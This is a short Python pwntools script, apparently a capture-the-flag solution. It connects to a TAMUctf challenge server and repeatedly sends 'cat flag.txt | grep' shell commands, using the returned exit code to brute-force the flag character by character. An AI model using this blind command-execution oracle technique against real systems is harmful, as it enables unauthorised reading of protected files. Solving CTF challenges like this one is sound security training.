from pwn import *
import string

terminal = remote("challenges.tamuctf.com", 3424)

print terminal.recv()

command = "cat flag.txt | grep \""
flag_start = "gigem{"

flag = list()
flag.append(flag_start)

found = False

while not found:
	for char in string.printable:
		command_sent = command + "".join(flag) + char + "\""
		print "[!] Sent: " + command_sent
		# I surround it with a try except block to automatically retry the attempt when it fails
		while True:
			try:
				terminal.sendline(command_sent)
				return_value = int(terminal.recv().split("\n")[0])
				sleep(1)
			except Exception:
				continue
			break
		print "[!] Received:" + str(return_value)
		if(int(return_value) == 0):
			print "[!] Flag so far: " + "".join(flag)
			print "[:)] We found the next flag char! ->" + char
			flag.append(char)
			if(char == "}"):
				found = True
			continue
		
		
print "[+] Flag is: " + "".join(flag)